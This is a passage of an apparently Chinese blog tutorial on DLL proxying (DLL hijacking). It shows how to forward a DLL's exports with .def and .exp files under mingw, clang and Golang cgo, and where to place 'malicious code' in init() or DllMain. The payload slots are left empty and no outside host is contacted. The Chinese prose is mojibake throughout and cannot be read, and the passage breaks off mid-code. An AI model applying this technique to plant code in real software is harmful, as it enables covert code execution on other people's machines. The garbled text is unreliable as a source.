\u0026#39;__main__\u0026#39;: main() ç„¶åæˆ‘ä»¬å¯ä»¥è·å¾—è¿™æ ·çš„è¾“å‡º\nä¸‹é¢çš„å…·ä½“æ€ä¹ˆç”Ÿæˆä¸å†è¿›è¡Œä»‹ç»ï¼Œå¦‚æœæ„Ÿå…´è¶£å¯ä»¥æŸ¥çœ‹ Windows Privilege Escalation - DLL Proxying æˆ– åŸºäºAheadLibå·¥å…·è¿›è¡ŒDLLåŠ«æŒ\ndll è½¬å‘ï¼ˆdll åŠ«æŒï¼‰çš„ mingw å®ç° å¦‚æœæœ‰çš„äººå’Œæˆ‘ä¸€æ ·ï¼Œä¸å–œæ¬¢å®‰è£…åºå¤§çš„ Visual Studioï¼Œä¹ æƒ¯ç”¨ gcc mingw æ¥å®Œæˆï¼Œæˆ‘ä»¬ä¹Ÿæ˜¯èƒ½å¤Ÿå®Œæˆçš„\ndef æ–‡ä»¶ä»‹ç» è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ gcc ç¼–è¯‘å™¨å’Œ mingw-w64ï¼ˆè¿™ä¸ªæ˜¯mingwçš„æ”¹è¿›ç‰ˆï¼‰\næ­¤å¤„æˆ‘ä»¬ä¸å†é‡‡ç”¨ç›´æ¥æŠŠé“¾æ¥æŒ‡ä»¤å†™å…¥ä»£ç æºæ–‡ä»¶çš„æ–¹å¼ï¼Œè€Œæ˜¯é‡‡ç”¨æ¨¡å—å®šä¹‰æ–‡ä»¶ (.Def)\næ¨¡å—å®šä¹‰ (.def) æ–‡ä»¶ä¸ºé“¾æ¥å™¨æä¾›æœ‰å…³å¯¼å‡ºã€å±æ€§å’Œæœ‰å…³è¦é“¾æ¥çš„ç¨‹åºçš„å…¶ä»–ä¿¡æ¯çš„ä¿¡æ¯ã€‚.def æ–‡ä»¶åœ¨æ„å»º DLL æ¯”è¾ƒæœ‰ç”¨ã€‚è¯¦æƒ…å¯å‚è§ MSDN Module-Definition (.Def) Files\nå½“ç„¶ï¼Œæˆ‘ä»¬é‡‡ç”¨è¿™ç§æ–¹å¼çš„åŸå› æ˜¯å› ä¸º .def èƒ½è¢« mingw-w64 æ‰€æ”¯æŒï¼Œæˆ‘ä»¬è¦åšçš„å°±æ˜¯åœ¨.defæ–‡ä»¶ä¸­å†™å…¥æˆ‘ä»¬è¦è½¬å‘åˆ°åŸå§‹dllçš„æ‰€æœ‰å‡½æ•°çš„åˆ—è¡¨ï¼Œå¹¶åœ¨ç¼–è¯‘dllçš„æ—¶å€™åœ¨GCCä¸­è®¾ç½®è¯¥ .def æ–‡ä»¶å‚ä¸é“¾æ¥ã€‚\nç®€å•çš„ç¤ºä¾‹ å®ç°æµç¨‹ è¿™é‡Œæˆ‘ä»¬é‡‡ç”¨ä¸€ä¸ªç®€å•çš„æ ·ä¾‹ï¼Œæˆ‘ä»¬é‡‡ç”¨å¸¸è§„å†™äº†ä¸€ä¸ª dll, è¯¥ dll æ–‡ä»¶å¯¼å‡ºä¸€ä¸ª add å‡½æ•°ï¼Œè¯¥å¯¼å‡ºå‡½æ•°çš„ä½œç”¨å°±æ˜¯æŠŠä¼ å…¥çš„ä¸¤ä¸ªæ•°å€¼è¿›è¡Œç›¸åŠ \n1 2 3 4 5 6 7 8 9 10 11 12 #include \u0026lt;Windows.h\u0026gt; extern \u0026#34;C\u0026#34; int __declspec(dllexport)add(int x, int y) { return x + y; } BOOL APIENTRY DllMain(HANDLE handle, DWORD dword, LPVOID lpvoid) { return true; } æˆ‘ä»¬å°†å®ƒç¼–è¯‘æˆ dll æ–‡ä»¶\n1 gcc add.cpp -shared -o add.dll ç„¶åæˆ‘ä»¬å†™ä¸€ä¸ªä¸»ç¨‹åºæ¥è°ƒç”¨å®ƒ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;Windows.h\u0026gt; typedef int(*lpAdd)(int, int); int main(int argc, char *argv[]) { HINSTANCE DllAddr; lpAdd addFun; DllAddr = LoadLibraryW(L\u0026#34;add.dll\u0026#34;); addFun = (lpAdd)GetProcAddress(DllAddr, \u0026#34;add\u0026#34;); if (NULL != addFun) { int res = addFun(100, 200); printf(\u0026#34;result: %d \\n\u0026#34;, res); } FreeLibrary(DllAddr); system(\u0026#34;pause\u0026#34;); return 0; } ç„¶åæˆ‘ä»¬è¿›è¡Œç¼–è¯‘æ‰§è¡Œ\n1 2 gcc main.cpp -o main.exe ./main.exe å¯ä»¥çœ‹åˆ°å¦‚ä¸‹è¾“å‡º\nç„¶åæˆ‘ä»¬å°†æˆ‘ä»¬åˆšæ‰ç”Ÿæˆçš„ add.dll é‡å‘½åä¸º _add.dll\nç„¶ååˆ›å»ºä¸€ä¸ª .def æ–‡ä»¶\nfunctions.def\n1 2 3 LIBRARY _add.dll EXPORTS add = _add.add @1 LIBRARY _add.dll ä»£è¡¨è½¬å‘åˆ° _add.dllï¼Œä¸‹é¢çš„ EXPORTS å®šä¹‰äº†éœ€è¦è½¬å‘çš„å‡½æ•°ï¼Œ= å‰é¢æ˜¯å¯¼å‡ºå‡½æ•°åï¼Œ= åé¢çš„ _add ä»£è¡¨è¦è½¬å‘åˆ°çš„ dll çš„åç§°ï¼Œadd ä»£è¡¨è¦è½¬å‘åˆ° _add.dll çš„å“ªä¸€ä¸ªå¯¼å‡ºå‡½æ•°ï¼Œå…³é”®åœ¨äº @1\næˆ‘ä»¬å¯ä»¥æ‹¿ DLL Export Viewer æˆ– StudyPE+ ç­‰å·¥å…·çœ‹çœ‹\næˆ‘ä»¬å¯ä»¥çœ‹åˆ° Ordinal, è¿™ä¸ªæ˜¯å¯¼å‡ºå‡½æ•°åºå·ï¼Œå°±æ˜¯ @1 çš„æ¥æºï¼Œå¦‚æœæœ‰å¤šä¸ªå¯¼å‡ºå‡½æ•°ï¼Œä¾æ¬¡å†™ä¸‹æ¥å³å¯\nç„¶åç¼–å†™æˆ‘ä»¬çš„æ¶æ„ dll\n1 2 3 4 5 6 7 #include \u0026lt;Windows.h\u0026gt; BOOL APIENTRY DllMain(HANDLE handle, DWORD dword, LPVOID lpvoid) { return true; } å¦‚ä¸Šæ‰€ç¤ºï¼Œå½“ç„¶ï¼Œè¿™åªæ˜¯ä¸€ä¸ªæ ·ä¾‹ï¼Œæ‰€ä»¥æˆ‘å¹¶æ²¡æœ‰å†™ä¸‹ä»»ä½•æ¶æ„ä»£ç \nç°åœ¨å¯ä»¥ç¼–è¯‘æˆ‘ä»¬çš„æ¶æ„dlläº†\n1 gcc -shared -o add.dll evil.cpp functions.def -sharedè¡¨ç¤ºæˆ‘ä»¬è¦ç¼–è¯‘ä¸€ä¸ªå…±äº«åº“ï¼ˆéé™æ€ï¼‰ -oæŒ‡å®šå¯æ‰§è¡Œæ–‡ä»¶çš„è¾“å‡ºæ–‡ä»¶å add.dllæ˜¯æˆ‘ä»¬æƒ³ç»™æˆ‘ä»¬çš„æ¶æ„ dll èµ·çš„åå­— evil.cppæ˜¯æˆ‘ä»¬åœ¨å…¶ä¸­ç¼–å†™æ¶æ„ dll ä»£ç çš„ .cpp æ–‡ä»¶ å¦‚æœç¼–è¯‘æˆåŠŸçš„è¯ï¼Œä½ åº”è¯¥èƒ½åœ¨åŒç›®å½•ä¸‹æ‰¾åˆ°åˆšåˆšç”Ÿæˆå¥½çš„æ¶æ„ dllï¼ˆadd.dllï¼‰\næˆ‘ä»¬å†ä½¿ç”¨ PE æŸ¥çœ‹å·¥å…·çœ‹çœ‹å¯¼å‡ºè¡¨\nå¯ä»¥çœ‹åˆ°ä¸­è½¬è¾“å‡ºè¡¨ä¸Šå·²ç»æœ‰äº†\næ³¨æ„æˆ‘ä»¬è¿™ä¸ª dll å¹¶æ²¡æœ‰å†™ä»»ä½•åŠŸèƒ½æ€§ä»£ç ï¼Œè®©æˆ‘ä»¬ä½¿ç”¨åˆšæ‰ç¼–è¯‘çš„ main.exe æµ‹è¯•ä¸€ä¸‹\nå¯ä»¥å‘ç°åŠŸèƒ½è½¬å‘æ­£å¸¸\nå½“ç„¶ï¼Œå½“å¯¼å‡ºå‡½æ•°è¿‡å¤šçš„æ—¶å€™æˆ‘ä»¬ä¸å¯èƒ½ä¸€ä¸ªä¸ªè‡ªå·±å»å¯¼å‡ºè¡¨é‡ŒæŠ„ï¼Œå¯ä»¥å†™ä¸€ä¸ªè„šæœ¬è‡ªåŠ¨åŒ–å®Œæˆè¿™ä¸ªå·¥ä½œï¼Œä¸è¿‡è¿™ä¸æ˜¯æˆ‘ä»¬æœ¬æ–‡çš„é‡ç‚¹ï¼Œæˆ–è€…ä½ å¯ä»¥ä½¿ç”¨ mingw-w64 é‡Œé¢è‡ªå¸¦çš„ gendef.exe å·¥å…·\n.def å’Œ .exp æ–‡ä»¶ expï¼š\næ–‡ä»¶æ˜¯æŒ‡å¯¼å‡ºåº“æ–‡ä»¶çš„æ–‡ä»¶ï¼Œç®€ç§°å¯¼å‡ºåº“æ–‡ä»¶ï¼Œå®ƒåŒ…å«äº†å¯¼å‡ºå‡½æ•°å’Œæ•°æ®é¡¹çš„ä¿¡æ¯ã€‚å½“LIBåˆ›å»ºä¸€ä¸ªå¯¼å…¥åº“ï¼ŒåŒæ—¶å®ƒä¹Ÿåˆ›å»ºä¸€ä¸ªå¯¼å‡ºåº“æ–‡ä»¶ã€‚å¦‚æœä½ çš„ç¨‹åºé“¾æ¥åˆ°å¦ä¸€ä¸ªç¨‹åºï¼Œå¹¶ä¸”ä½ çš„ç¨‹åºéœ€è¦åŒæ—¶å¯¼å‡ºå’Œå¯¼å…¥åˆ°å¦ä¸€ä¸ªç¨‹åºä¸­ï¼Œè¿™ä¸ªæ—¶å€™å°±è¦ä½¿ç”¨åˆ°expæ–‡ä»¶(LINKå·¥å…·å°†ä½¿ç”¨EXPæ–‡ä»¶æ¥åˆ›å»ºåŠ¨æ€é“¾æ¥åº“)ã€‚\ndefï¼š\ndefæ–‡ä»¶çš„ä½œç”¨å³æ˜¯ï¼Œå‘ŠçŸ¥ç¼–è¯‘å™¨ä¸è¦ä»¥microsoftç¼–è¯‘å™¨çš„æ–¹å¼å¤„ç†å‡½æ•°åï¼Œè€Œä»¥æŒ‡å®šçš„æŸæ–¹å¼ç¼–è¯‘å¯¼å‡ºå‡½æ•°ï¼ˆæ¯”å¦‚æœ‰å‡½æ•°funcï¼Œè®©ç¼–è¯‘å™¨å¤„ç†åå‡½æ•°åä»ä¸ºfuncï¼‰ã€‚è¿™æ ·ï¼Œå°±å¯ä»¥é¿å…ç”±äºmicrosoft VC++ç¼–è¯‘å™¨çš„ç‹¬ç‰¹å¤„ç†æ–¹å¼è€Œå¼•èµ·çš„é“¾æ¥é”™è¯¯ã€‚\nä»ä¸Šé¢çš„ä»‹ç»ä¸­æˆ‘ä»¬å¯ä»¥çœ‹å‡º .exp æ–‡ä»¶å¯ä»¥ç”¨åœ¨é“¾æ¥é˜¶æ®µï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆä½¿ç”¨ dlltool å·¥å…·å°† .def è½¬åŒ–ä¸º .exp æ–‡ä»¶ï¼Œç„¶åç¼–è¯‘ evil.cpp åˆ° evil.o å†æ‰‹åŠ¨è¿›è¡Œé“¾æ¥ã€‚\n1 2 3 gcc -c -O3 evil.cpp dlltool --output-exp functions.exp --input-def functions.def ld -o add.dll functions.exp evil.o é¢å¤–çš„è¯´æ˜ å½“ç„¶ï¼Œä½ ä¹Ÿå¯ä»¥é€šè¿‡ clang æ¥å®Œæˆè¿™é¡¹å·¥ä½œ\n1 clang -shared evil.cpp -o add.dll -Wl\u0026#34;/DEF:functions.def\u0026#34; æˆ‘ä»¬å¦‚ä½•ç”¨ Golang æ¥å®ç°è½¬å‘ dll Golang æä¾›äº†å®˜æ–¹çš„åŠ¨æ€é“¾æ¥åº“ï¼ˆdllï¼‰ç¼–è¯‘å‘½ä»¤ go build -buildmode=c-shared -o exportgo.dll exportgo.goï¼Œæ ¹æ®æˆ‘ä»¬å‰é¢é“ºå«çš„åŸºç¡€ï¼Œç°é˜¶æ®µæ‰€éœ€è¦æ€è€ƒçš„æ˜¯ï¼šå¦‚ä½•æŠŠ .def æ–‡ä»¶æˆ– .exp æ–‡ä»¶ä¹Ÿå¸¦å…¥è¿›å»ï¼Ÿ\nä¸‹æ–‡æˆ‘å°†ç”¨ gcc ä½œä¸º cgo çš„å¤–éƒ¨é“¾æ¥å™¨ï¼Œclangä¹Ÿå¯ä»¥æŒ‰ç…§åŒæ ·çš„æ€æƒ³\nå°è¯•ä¸æ€è€ƒ ä¸ºä»€ä¹ˆä¸è€ƒè™‘åˆ©ç”¨cgoç›´æ¥åœ¨cä»£ç ä¸­å†™ #progma comment(linker, '/EXPORT')ï¼Œè¿™ä¸ªçš„ä¸»è¦åŸå› æ˜¯ Golang çš„ cgo èƒ½åŠ›ç°é˜¶æ®µåªæ”¯æŒ clang å’Œ gccï¼ŒMSVCç¼–è¯‘å™¨å¹¶ä¸æ”¯æŒ9ã€‚\nè®©æˆ‘ä»¬ç°åœ¨æ¥æ€è€ƒä¸€ä¸‹æ•´ä¸ªç¼–è¯‘æµç¨‹ï¼š\né¢„å¤„ç† é¢„å¤„ç†ç”¨äºå°†æ‰€æœ‰çš„#includeå¤´æ–‡ä»¶ä»¥åŠå®å®šä¹‰æ›¿æ¢æˆå…¶çœŸæ­£çš„å†…å®¹ ç¼–è¯‘ å°†ç»è¿‡é¢„å¤„ç†ä¹‹åçš„ç¨‹åºè½¬æ¢æˆç‰¹å®šæ±‡ç¼–ä»£ç (assembly code)çš„è¿‡ç¨‹ æ±‡ç¼– æ±‡ç¼–è¿‡ç¨‹å°†ä¸Šä¸€æ­¥çš„æ±‡ç¼–ä»£ç è½¬æ¢æˆæœºå™¨ç (machine code)ï¼Œè¿™ä¸€æ­¥äº§ç”Ÿçš„æ–‡ä»¶å«åšç›®æ ‡æ–‡ä»¶ï¼Œæ˜¯äºŒè¿›åˆ¶æ ¼å¼ã€‚gccæ±‡ç¼–è¿‡ç¨‹é€šè¿‡aså‘½ä»¤å®Œæˆï¼Œè¿™ä¸€æ­¥ä¼šä¸ºæ¯ä¸€ä¸ªæºæ–‡ä»¶äº§ç”Ÿä¸€ä¸ªç›®æ ‡æ–‡ä»¶ é“¾æ¥ é“¾æ¥è¿‡ç¨‹å°†å¤šä¸ªç›®æ ‡æ–‡ä»¥åŠæ‰€éœ€çš„åº“æ–‡ä»¶(.soç­‰)é“¾æ¥æˆæœ€ç»ˆçš„å¯æ‰§è¡Œæ–‡ä»¶(executable file)ã€‚ å‰ä¸‰æ­¥éƒ½æ˜¯åœ¨å°†ä»£ç å¤„ç†æˆäºŒè¿›åˆ¶æœºå™¨ç ï¼Œè€Œæˆ‘ä»¬æ‰€è¦æ“æ§çš„å¯¼å‡ºè¡¨æ˜¯å±äºæ–‡ä»¶æ ¼å¼çš„ä¸€éƒ¨åˆ†ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯éœ€è¦åœ¨é“¾æ¥è¿™ä¸ªæ­¥éª¤åšæ–‡ç« \nå€ŸåŠ©è¿™ä¸ªæ€è·¯ï¼Œæˆ‘ä»¬å¯¹ä¸Šé¢çš„æ ·ä¾‹åšåšæ–‡ç« ã€‚\né¦–å…ˆæŠŠæˆ‘ä»¬çš„ evil.cpp ç¼–è¯‘æ±‡ç¼–æˆç›®æ ‡æ–‡ä»¶ï¼Œç„¶åé“¾æ¥æ—¶åŠ å…¥é¢å¤–æ§åˆ¶ã€‚\n1 2 3 4 # evil.cpp ç¼–è¯‘æ±‡ç¼–æˆ evil.o ç›®æ ‡æ–‡ä»¶ï¼ˆä¸‹é¢çš„ -O3 æ˜¯ä¸ºäº†å¯ç”¨ O3 ä¼˜åŒ–ï¼Œå¯é€‰ï¼‰ gcc -c O3 evil.cpp # å’Œ .def æ–‡ä»¶ä¸€èµ·è¿›è¡Œé“¾æ¥ ld -o add.dll functions.def evil.o æˆ–è€…åˆ©ç”¨ä¸Šæ–‡ä¸­å…ˆå°† .def è½¬åŒ–æˆ .exp å†è¿›è¡Œæ‰‹åŠ¨é“¾æ¥ï¼Œæˆ‘ä»¬å‡èƒ½å¾—åˆ°æˆ‘ä»¬é¢„æœŸçš„è½¬å‘dllã€‚\ngolang ä¸­çš„å®ç° æˆ‘ä»¬çš„ç›®çš„æ˜¯éœ€è¦æŠŠ .def æˆ– .exp æ–‡ä»¶æ”¾å…¥æ•´ä¸ªç¼–è¯‘æµç¨‹çš„é“¾æ¥ç¯èŠ‚ä¸­å»ã€‚\né¦–å…ˆæˆ‘ä»¬éœ€è¦å…ˆäº†è§£ä¸€ä¸‹ cgo çš„å·¥ä½œæ–¹å¼11ï¼šå®ƒç”¨cç¼–è¯‘å™¨ç¼–è¯‘cï¼Œç”¨Goç¼–è¯‘å™¨ç¼–è¯‘Goï¼Œç„¶åä½¿ç”¨ gcc æˆ– clang å°†ä»–ä»¬é“¾æ¥åœ¨ä¸€èµ·ï¼Œæˆ‘ä»¬ç”šè‡³èƒ½å¤Ÿé€šè¿‡ CGO_LDFLAGS æ¥å°†flagä¼ é€’è‡³é“¾æ¥å™¨ã€‚\nåœ¨æˆ‘ä»¬Golangç¨‹åºç¼–è¯‘å‘½ä»¤ä¸­ï¼Œç›¸ä¿¡å¤§å®¶ä½¿ç”¨è¿‡ -ldflags=\u0026quot;\u0026quot; é€‰é¡¹ï¼Œè¿™ä¸ªå…¶å®æ˜¯ go tool link å¸¦æ¥çš„ï¼Œgo build åªæ˜¯ä¸€ä¸ªå‰ç«¯ï¼ŒGo æä¾›äº†ä¸€ç»„ä½çº§å·¥å…·æ¥ç¼–è¯‘å’Œé“¾æ¥ç¨‹åºï¼Œgo buildåªéœ€æ”¶é›†æ–‡ä»¶å¹¶è°ƒç”¨è¿™äº›å·¥å…·ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ä½¿ç”¨-xæ ‡å¿—æ¥è·Ÿè¸ªå®ƒçš„ä½œç”¨ã€‚ä¸è¿‡è¿™é‡Œæˆ‘ä»¬å¹¶ä¸å…³å¿ƒè¿™ä¸ªã€‚\næˆ‘ä»¬å»çœ‹çœ‹ go tool linkçš„è¯´æ˜ä¹¦ï¼Œå¸®åŠ©æ–‡ä»¶é‡Œé¢æåˆ°äº†\n1 2 3 4 -extld linker Set the external linker (default \u0026#34;clang\u0026#34; or \u0026#34;gcc\u0026#34;). -extldflags flags Set space-separated flags to pass to the external linker. -extld ä¸€èˆ¬æˆ‘ä»¬ä¸éœ€è¦æ›´æ”¹ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åªéœ€è¦æƒ³åŠæ³•ä¿®æ”¹ -extldflags è®©é“¾æ¥è¿‡ç¨‹å¸¦å…¥æˆ‘ä»¬çš„ .def æˆ– .exp æ–‡ä»¶å³å¯ã€‚\nä½†æ˜¯ï¼Œæˆ‘ä»¬åˆšæ‰ä½¿ç”¨ ld ç¼–è¯‘çš„æ—¶å€™ï¼Œéƒ½æ˜¯ç›´æ¥å°† .def æˆ– .exp æ–‡ä»¶ä¼ å…¥çš„ï¼Œå¦‚ä½•é€šè¿‡ ld çš„å‚æ•°ä¼ å…¥å‘¢ï¼Ÿ\nåœ¨ gcc çš„é“¾æ¥é€‰é¡¹ é‡Œï¼Œæœ‰ä¸€ä¸ªé€‰é¡¹æ˜¯ -Wlï¼Œç”¨æ³•ä¸º -Wl,optionï¼Œå®ƒçš„ä½œç”¨å°±æ˜¯å°†-Wlåçš„optionä½œä¸ºæ ‡è¯†ä¼ é€’ç»™ ld å‘½ä»¤ï¼Œå¦‚æœ option ä¸­åŒ…å« ,ï¼Œåˆ™æ ¹æ® , æ‹†åˆ†ä¸ºå¤šä¸ªæ ‡è¯†ä¼ é€’ç»™ ldï¼Œå¯èƒ½çœ‹åˆ°è¿™é‡Œä½ å¯¹äºè¿™ä¸ªé€‰é¡¹è¿˜æ˜¯ä¸€çŸ¥åŠè§£ï¼Œä¸‹é¢ä¸¾ä¸ªä¾‹å­\n1 2 gcc -c evil.cpp ld -o add.dll functions.def evil.o ç­‰åŒäº\n1 gcc -shared -o add.dll -Wl,functions.def evil.cpp ç­‰åŒäº\n1 gcc -shared -Wl,functions.def,-o,add.dll evil.cpp ä¹Ÿå°±æ˜¯ -Wl åé¢çš„ä¸œè¥¿éƒ½ä¼šä¼ é€’é“¾æ¥å™¨\næ‰€ä»¥æˆ‘ä»¬å°† .def æˆ– .exp æ–‡ä»¶åˆ©ç”¨ -Wl é€‰é¡¹è®¾ç½®åˆ° -extldflags ä¸Šå»å³å¯ã€‚\næ‰€ä»¥æˆ‘ä»¬ç°åœ¨å¯ä»¥åˆ›å»ºä¸€ä¸ªæ ·ä¾‹ go ç¨‹åºç”¨æ¥ç¼–è¯‘ dll\nmain.go\n1 2 3 4 5 6 7 package main import \u0026#34;C\u0026#34; func main() { // Need a main function to make CGO compile package as C shared library } ç„¶åè¿›è¡Œç¼–è¯‘\n1 go build -buildmode=c-shared -o add.dll -ldflags=\u0026#34;-extldflags=-Wl,C:/Users/Akkuman/Desktop/go-dll-proxy/article/functions.def\u0026#34; main.go æ³¨æ„ï¼š-Wlåé¢è¦å†™ä¸Š .def æˆ– .exp æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ï¼Œä¸»è¦æ˜¯ç”±äºè°ƒç”¨ç¨‹åºæ—¶å€™çš„å·¥ä½œè·¯å¾„é—®é¢˜ï¼Œåªéœ€è¦è®°ä½è¿™ä¸€ç‚¹å³å¯ã€‚\nç°åœ¨æˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ª golang ç¼–è¯‘å‡ºæ¥çš„è½¬å‘dll\nå½“ç„¶ï¼Œä½ å¯èƒ½ä¼šå¯¹é‚£ä¸ª _cgo_dummy_export å¯¼å‡ºå‡½æ•°æ¯”è¾ƒç–‘æƒ‘ï¼Œè¿™ä¸ªæ˜¯golangç¼–è¯‘çš„dllæ‰€ç‰¹æœ‰çš„ï¼Œå¦‚æœä½ æƒ³è¦å»é™¤æ‰å®ƒï¼Œå¯ä»¥ä½¿ç”¨ .exp æ¥è¿›è¡Œé“¾æ¥\n1 go build -buildmode=c-shared -o add.dll -ldflags=\u0026#34;-extldflags=-Wl,C:/Users/Akkuman/Desktop/go-dll-proxy/article/functions.exp\u0026#34; main.go dll è½¬å‘çš„æ€»ç»“ å…¶å® cgo ä¸»è¦çš„ç¼–è¯‘æ‰‹æ®µä¸ºï¼šç”¨cç¼–è¯‘å™¨ç¼–è¯‘cï¼Œç”¨Goç¼–è¯‘å™¨ç¼–è¯‘Goï¼Œç„¶åä½¿ç”¨ gcc æˆ– clang å°†ä»–ä»¬é“¾æ¥åœ¨ä¸€èµ·ã€‚æˆ‘ä»¬æ‰€éœ€è¦åšçš„åªæ˜¯å°†å®ƒä»¬ç²˜åˆåœ¨ä¸€èµ·ã€‚\nåœ¨ Golang ä¸­å¦‚ä½•å®ç°æ¶æ„ dll æˆ‘ä»¬å·²ç»çŸ¥é“äº†è¯¥æ€ä¹ˆåœ¨ Golang ä¸­å®ç°è½¬å‘ dllï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥å°è¯•å®ç°æ¶æ„ dll äº†ã€‚\ninit å†™æ³• å¦‚æœä½ çœ‹è¿™ç¯‡æ–‡ç« ï¼Œç›¸ä¿¡ä½ å·²ç»çŸ¥é“ Go ä¼šé»˜è®¤æ‰§è¡ŒåŒ…ä¸­çš„ init() æ–¹æ³•ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŠŠæˆ‘ä»¬çš„æ¶æ„ä»£ç å®šä¹‰åˆ°è¿™ä¸ªå‡½æ•°é‡Œé¢å»ã€‚\nä¸€èˆ¬çš„dllå®ç°æ–¹å¼ä¸º\n1 2 3 4 5 6 7 8 9 package main func Add(x, y int) int { return x + y } func main() { // Need a main function to make CGO compile package as C shared library } æˆ‘ä»¬åªéœ€è¦åŠ ä¸Šä¸€ä¸ª init æ–¹æ³•ï¼Œå¹¶ä¸”è®©æ¶æ„ä»£ç å¼‚æ­¥æ‰§è¡Œå³å¯ï¼ˆé˜²æ­¢ LoadLibrary å¡ä½ï¼‰\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package main func init() { go func() { // ä½ çš„æ¶æ„ä»£ç  }() } func Add(x, y int) int { return x + y } func main() { // Need a main function to make CGO compile package as C shared library } å¯¹äº windows dll æ›´ç»†ç²’åº¦çš„æ§åˆ¶ å¯¹äºwindows dllï¼ŒDllMain11 æ˜¯ä¸€ä¸ªå¯é€‰çš„å…¥å£å‡½æ•°\nå¯¹äº DllMain çš„ä»‹ç»ï¼Œæˆ‘è¿™é‡Œå°±ä¸å†èµ˜è¿°äº†ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥è‡ªè¡Œè¿›è¡ŒæŸ¥è¯¢\nç³»ç»Ÿæ˜¯åœ¨ä»€ä¹ˆæ—¶å€™è°ƒç”¨DllMainå‡½æ•°çš„å‘¢ï¼Ÿé™æ€é“¾æ¥æˆ–åŠ¨æ€é“¾æ¥æ—¶è°ƒç”¨LoadLibraryå’ŒFreeLibraryéƒ½ä¼šè°ƒç”¨DllMainå‡½æ•°ã€‚DllMainçš„ç¬¬äºŒä¸ªå‚æ•°fdwReasonæŒ‡æ˜äº†ç³»ç»Ÿè°ƒç”¨Dllçš„åŸå› ï¼Œå®ƒå¯èƒ½æ˜¯:ï¼š\nDLL_PROCESS_ATTACH: å½“ä¸€ä¸ªDLLæ–‡ä»¶é¦–æ¬¡è¢«æ˜ å°„åˆ°è¿›ç¨‹çš„åœ°å€ç©ºé—´æ—¶ DLL_PROCESS_DETACH: å½“DLLè¢«ä»è¿›ç¨‹çš„åœ°å€ç©ºé—´è§£é™¤æ˜ å°„æ—¶ DLL_THREAD_ATTACH: å½“è¿›ç¨‹åˆ›å»ºä¸€çº¿ç¨‹æ—¶ï¼Œç¬¬n(n\u0026gt;=2)æ¬¡ä»¥ååœ°æŠŠDLLæ˜ åƒæ–‡ä»¶æ˜ å°„åˆ°è¿›ç¨‹çš„åœ°å€ç©ºé—´æ—¶ï¼Œæ˜¯ä¸å†ç”¨DLL_PROCESS_ATTACHè°ƒç”¨DllMainçš„ã€‚è€ŒDLL_THREAD_ATTACHä¸åŒï¼Œè¿›ç¨‹ä¸­çš„æ¯æ¬¡å»ºç«‹çº¿ç¨‹ï¼Œéƒ½ä¼šç”¨å€¼DLL_THREAD_ATTACHè°ƒç”¨DllMainå‡½æ•°ï¼Œå“ªæ€•æ˜¯çº¿ç¨‹ä¸­å»ºç«‹çº¿ç¨‹ä¹Ÿä¸€æ · DLL_THREAD_DETACH: å¦‚æœçº¿ç¨‹è°ƒç”¨äº†ExitThreadæ¥ç»“æŸçº¿ç¨‹ï¼ˆçº¿ç¨‹å‡½æ•°è¿”å›æ—¶ï¼Œç³»ç»Ÿä¹Ÿä¼šè‡ªåŠ¨è°ƒç”¨ExitThreadï¼‰ï¼Œç³»ç»ŸæŸ¥çœ‹å½“å‰æ˜ å°„åˆ°è¿›ç¨‹ç©ºé—´ä¸­çš„æ‰€æœ‰DLLæ–‡ä»¶æ˜ åƒï¼Œå¹¶ç”¨DLL_THREAD_DETACHæ¥è°ƒç”¨DllMainå‡½æ•°ï¼Œé€šçŸ¥æ‰€æœ‰çš„DLLå»æ‰§è¡Œçº¿ç¨‹çº§çš„æ¸…ç†å·¥ä½œ è¿™äº›æµç¨‹æ ¹æ®ä½ è‡ªå·±çš„éœ€æ±‚æ¥è¿›è¡Œæ§åˆ¶ã€‚å½“ç„¶ï¼Œå¦‚æœä½ æœ‰è¿‡ Windows ç¼–ç¨‹ç»éªŒï¼Œåº”è¯¥å¯¹è¿™ä¸ªæ¯”è¾ƒç†Ÿæ‚‰ã€‚\nGolang æ˜¯ä¸€ä¸ªæœ‰ GC çš„è¯­è¨€ï¼Œéœ€è¦åœ¨åŠ è½½æ—¶è¿è¡Œ Golang æœ¬èº«çš„è¿è¡Œæ—¶ï¼Œæ‰€ä»¥æš‚æ—¶æ²¡æœ‰å¤ªå¥½çš„æ–¹æ¡ˆåœ¨ Golang ä¸­å®ç° DllMain è®©å¤–å±‚ç›´æ¥è°ƒç”¨å…¥å£ç‚¹ï¼Œå› ä¸ºæ²¡æœ‰åˆå§‹åŒ–è¿è¡Œæ—¶ã€‚\næˆ‘ä»¬å¯ä»¥å˜ç›¸é€šè¿‡ cgo æ¥å®ç°è¿™ä¸ªç›®çš„ã€‚æ€»ä½“æ€è·¯ä¸ºï¼Œåˆ©ç”¨ C æ¥å†™ DllMainï¼Œé€šè¿‡ c æ¥è°ƒç”¨ Golang çš„å‡½æ•°\nä»¥ä¸‹ç¤ºä¾‹ä»£ç å¤§å¤šæ¥è‡ª github.com/NaniteFactory/dllmain\nc å®ç° DllMain é¦–å…ˆæˆ‘ä»¬å¯ä»¥åœ¨ c ä¸­å®šä¹‰æˆ‘ä»¬è‡ªå·±çš„ DllMain\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 #include \u0026#34;dllmain.h\u0026#34; typedef struct { HINSTANCE hinstDLL; // handle to DLL module DWORD fdwReason; // reason for calling function // reserved LPVOID lpReserved; // reserved } MyThreadParams; DWORD WINAPI MyThreadFunction(LPVOID lpParam) { MyThreadParams params = *((MyThreadParams*)lpParam); OnProcessAttach(params.hinstDLL, params.fdwReason, params.lpReserved); free(lpParam); return 0; } BOOL WINAPI DllMain( HINSTANCE _hinstDLL, // handle to DLL module DWORD _fdwReason, // reason for calling function LPVOID _lpReserved) // reserved { 